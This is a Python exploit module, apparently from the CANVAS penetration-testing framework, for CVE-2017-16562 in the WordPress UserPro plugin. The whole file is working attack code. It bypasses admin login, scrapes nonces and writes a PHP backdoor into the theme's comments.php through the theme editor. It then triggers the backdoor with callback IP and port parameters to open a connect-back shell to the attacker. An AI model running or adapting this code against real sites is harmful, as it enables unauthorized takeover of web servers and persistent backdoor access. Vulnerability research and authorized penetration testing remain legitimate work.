#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string
import re
import urllib
from urllib import urlencode

import logging

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from ExploitTypes.phpexploit import *
import canvasengine
from phplistener import get_php_stage1


NAME                            = "Wordpress Remote Command Execution Through UserPro Plugin login bypass"
DESCRIPTION                     = "UserPro plugin RCE through login bypass"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "UserPro Plugin"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2017-16562"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16562"
DOCUMENTATION["References"]     = "https://www.exploit-db.com/exploits/43117/"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux", "Windows"] ]
PROPERTY['VERSION']             = [ "" ]

NOTES = """

We chain two vulnerabilities in UserPro wordpress plugin to achieve command execution
"""

CHANGELOG = """
"""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port = 80
        self.hostname = "localhost"
        self.ssl = False
        self.basepath = "/"
        self.command = None
        self.basicauth_user = None
        self.basicauth_password = None
        self.user = None
        self.password = None
        self.foundstrings = None
        self.testfile = None
        self.shellnum = None
        self.command = None
        self.url = ""

        self.callback_ip = None # ADDED LINE
        self.callback_port = 5555
        self.UA = None
        self.wpVersion = None
        self.file_to_upload = "backdoors/php_callback.php"

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                [optional]")
        logging.info("-O basepath: /path/to/app/      [optional]")
        logging.info("-O hostname: target vhost       [optional]")
        logging.info("-O command:commandtorun         [optional]")
        logging.info("-l call back ip if doing connect back")
        logging.info("-d listening port for call back")

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host           = self.target.interface
        self.ssl            = self.argsDict.get("ssl", self.ssl)
        self.basepath       = self.argsDict.get("basepath", self.ssl)

        self.callback_ip    = self.engine.get_callback_interface(self.host)

        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        self.url    = protocol + "://" + self.host + ":" + str(self.port) + self.basepath
        self.UA     = self.setup_UA()

        return

    def setup_UA(self):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            logging.info("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

            UA = spkproxy.UserAgent(self.url, auth=auth, hostname=self.hostname, exploit=self)

            #UA = spkproxy.UserAgent(self.url, auth=auth, hostname=self.hostname, exploit=self, proxyhost="127.0.0.1", proxyport=8080)

            logging.info('Actual user agent info: ' + str(UA))

            return UA

    def testEndPoint(self):
        (endpData, endpCode) = self.UA.GET("/wp-content/plugins/userpro", return_response_code=True)

        if endpCode != 404:
            logging.info("Endpoint is running Wordpress and UserPro plugin with it!")
            (wpData, wpCode) = self.UA.GET("/", return_response_code=True)
            if wpCode == 200: #if wpCode == 200:
                self.wpVersion = self.grabWPVersion()
                if self.wpVersion == "WordPress 4.9.2":
                    logging.info("Wordpress Version >= 4.9.x (AJAX)")
                    self.asyncPwn() # WordPress versions >= 4.9 implements AJAX, so things like nonce settings differ from older distributions
                    return True
                else:
                    logging.info("Wordpress Version < 4.9.x (Classic Sync Server Calls)")
                    self.syncPwn() # WordPress versions < 4.9 runs as any other old version, without any change, making synchronic server calls
                    return True
            else:
                logging.error("Unexpected server response (Code: %s), target is not vulnerable" % wpCode)
                return False

    def grabWPVersion(self):
        (wpVerData, wpVerCode) = self.UA.GET("/", return_response_code=True)

        if wpVerCode == 200:
            version = self.scrapdata(wpVerData, "version")
            return version
        else:
            logging.error("Unexpected server response while trying to get WP Version (Code: %s)" % wpVerCode)

    def scrapdata(self, html_text, searchfor): # searchfor = [version | syncNonce| asyncNonce | asyncNonceHeartb | commentphpSync | commentphpAsync]
        if searchfor == "version": #Grabs endpoint's current WordPress version
            expression = re.compile('.*?<meta name="generator" content="(.*?)" />.*?', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            version = m.group(1)
            return version
        elif searchfor == "syncNonce": #In regular situations, hidden nonce travels with '_wpnonce' value under the id attribute
            expression = re.compile('.*<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)" />.*', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            syncNonceEarly = m.group(1)
            return syncNonceEarly
        elif searchfor == "asyncNonce": #In AJAX situations, hidden nonce travel with a different value for the id attribute
            expression = re.compile('.*<input type="hidden" id="nonce" name="nonce" value="(.*?)" />.*', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            syncNonceLate = m.group(1)
            return syncNonceLate
        elif searchfor == "asyncNonceHeartb": #Search for hearthbeat's nonce in AJAX situations
            expression =  re.compile('.*?var heartbeatSettings = {"nonce":"(.*?)"};.*?', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            asyncNonce = m.group(1)
            return asyncNonce
        elif searchfor == "commentphpSync": #Search for the comment.php file in regular situations
            expression = re.compile('.*?<textarea cols="70" rows="30" name="newcontent" id="newcontent" aria-describedby="newcontent-description">(.*?)</textarea>.*?', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            commentphpSync = m.group(1)
            return commentphpSync
        elif searchfor == "commentphpAsync": #Search for comment.php file in AJAX situations
            expression = re.compile('.*?<textarea cols="70" rows="30" name="newcontent" id="newcontent" aria-describedby="editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4">(.*?)</textarea>.*?', re.MULTILINE | re.DOTALL)
            m = expression.match(html_text)
            commentphpAsync = m.group(1)
            return commentphpAsync

    def syncPwn(self):
        self.adminLoginBypass()
        self.uploadPhpCallbackSync()

    def asyncPwn(self):
        self.adminLoginBypass()
        self.uploadPhpCallbackAsync()

    def adminLoginBypass(self):
        logging.info("Attempting to bypass the login instance as Admin")
        # logging.info("http://%s/index.php?up_auto_log=true" % self.host)

        (bypData, bypCode) = self.UA.GET("/index.php?up_auto_log=true", return_response_code=True)
        logging.info("Response Code: %s" % bypCode)

        if bypCode == 301:
            logging.info("Cookie = %s" % self.UA.cookies)
            return 1
        else:
            logging.error("Unexpected Admin login bypass error")
            return 0

    def uploadPhpCallbackSync(self):
        logging.info("Attempting to upload the PHP Backdoor (Sync)")
        (backdData) = self.UA.GET("/wp-admin/theme-editor.php?file=comments.php&theme=twentyseventeen")

        try:
            #GETTING THE BACKDOOR's CODE
            backdPhpCode = open(self.file_to_upload, "rb").read()
            origCommentsphp = self.scrapdata(backdData, "commentphpSync")
            logging.info("Creating a backup for the original comment.php file under CANVAS_ROOT/exploits/web/wpuserpro_rce/")
            # backupCommentsphp = open("")
            syncNonce = self.scrapdata(backdData, "syncNonce")

            payloadDelivery = '_wpnonce=' + syncNonce + '&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dcomments.php%26theme%3Dtwentyseventeen%26scrollto%3D225&newcontent=' + urlencode(backdPhpCode + origCommentsphp) + '&action=update&file=comments.php&theme=twentyseventeen&scrollto=90&submit=Update+File'
            (payDevData, payDevCode) = self.UA.POST("/wp-admin/theme-editor.php", payloadDelivery, return_response_code=True)
            if payDevCode == 302:
                logging.info("PHP backdoor successfuly uploaded")
                self.triggerBackdoorSync()
                return 1
            else:
                logging.error("Unexpected error while uploading PHP backdoor (Code: %s)" % payDevCode)
                return 0

        except Exception as e :
            logging.error("Unable to open PHP Backdoor source file %s" % self.file_to_upload)
            logging.info(e)


    def uploadPhpCallbackAsync(self):
        logging.info("Attempting to upload the PHP Backdoor (Async)")
        (backdData) = self.UA.GET("/wp-admin/theme-editor.php?file=comments.php&theme=twentyseventeen")

        try:
            #GETTING THE BACKDOOR's CODE
            backdPhpCode = open(self.file_to_upload, "rb").read()
            origCommentsphp = self.scrapdata(backdData, "commentphpAsync")
            logging.info("Creating a backup for the original comment.php file under CANVAS_ROOT/exploits/web/wpuserpro_rce/")
            #backupCommentsphp = open("")
            heartbNonce = self.scrapdata(backdData, "asyncNonceHeartb")
            asyncNonce = self.scrapdata(backdData, "asyncNonce")

            heartbeatDelivery = 'interval=60&_nonce=' + heartbNonce + '&action=heartbeat&screen_id=theme-editor&has_focus=false'
            payloadDelivery = 'nonce=' + asyncNonce + '&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dcomments.php%26theme%3Dtwentyseventeen&newcontent=' + urlencode(backdPhpCode + origCommentsphp) + '&action=edit-theme-plugin-file&file=comments.php&theme=twentyseventeen&docs-list='
            (heartbData, heartbCode) = self.UA.POST("/wp-admin/admin-ajax.php", heartbeatDelivery, return_response_code=True)
            if heartbCode == 200:
                (payDevData, payDevCode) = self.UA.POST("/wp-admin/admin-ajax.php", payloadDelivery, return_response_code=True)
                if payDevCode == 200:
                    logging.info("PHP backdoor successfuly uploaded")
                    self.triggerBackdoorAsync()
                    return 1
                else:
                    logging.error("Unexpected error while uploading PHP backdoor (callback) (Code: %s)" % payDevCode)
                    return 0
            else:
                logging.error("Unexpected error while uploading PHP backdoor (heartbeat) (Code: %s)" % heartbCode)

        except:
            logging.error("Unable to open PHP Backdoor source file %s" % self.file_to_upload)

    def triggerBackdoorSync(self):
        logging.info("Attempting to trigger the PHP Backdoor (Sync)")
        # Backdoor triggering
        (trigData, trigCode) = self.UA.GET("/wp-content/themes/twentyseventeen/comments.php?cb_ip=%s&cb_port=%s" % (self.callback_ip, self.callback_port), return_response_code=True) # self.callback.port > 5555
        logging.info("The triggering request response code is: %s" % trigCode)
        if trigCode == 200:
            logging.info("PHP Backdoor successfully triggered")
        else:
            logging.error("Unexpected error while trying to trigger the PHP backdoor")

    def triggerBackdoorAsync(self):
        logging.info("Attempting to trigger PHP Backdoor (Async)")
        (trigData, trigCode) = self.UA.GET("/wp-content/themes/twentyseventeen/comments.php?cb_ip=%s&cb_port=%s" % (self.callback_ip, self.callback_port), return_response_code=True)
        if trigCode == 200:
            logging.info("PHP Backdoor successfully triggered")
        else:
            logging.error("Unexpected error while trying to trigger the PHP Backdoor")

    def run(self):
        self.getargs()
        logging.info("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))

        if not self.testEndPoint():
            #FAILURE: ENDPOIT NOT EXPLOITABLE
            return 0
        else:
            #SUCCESS
            self.setSucceeded()
            logging.info("%s Execution Successful" % NAME)
            return 1

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

